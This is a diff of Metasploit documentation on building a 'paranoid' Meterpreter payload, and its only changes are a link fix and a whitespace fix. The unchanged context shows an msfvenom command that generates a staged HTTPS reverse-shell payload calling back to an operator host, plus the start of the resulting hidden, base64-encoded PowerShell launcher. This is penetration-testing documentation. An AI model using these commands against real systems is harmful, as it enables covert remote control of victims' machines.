@@ -14,12 +14,12 @@ rm -f www.example.com.key  www.example.com.crt
 
 ### Create a Paranoid Payload
 
-For this use case, we will combine [[Payload UUID]] tracking and whitelisting with [TLS pinning](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-HTTP-Communication#tls-certificate-pinning). For a staged payload, we will use the following command:
+For this use case, we will combine [[Payload UUID]] tracking and whitelisting with [[TLS pinning|./Meterpreter-HTTP-Communication.md]]. For a staged payload, we will use the following command:
 
 ```
 $ ./msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o launch-paranoid.bat
 
-$ head launch-paranoid.bat 
+$ head launch-paranoid.bat
 %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg...
 ```
 
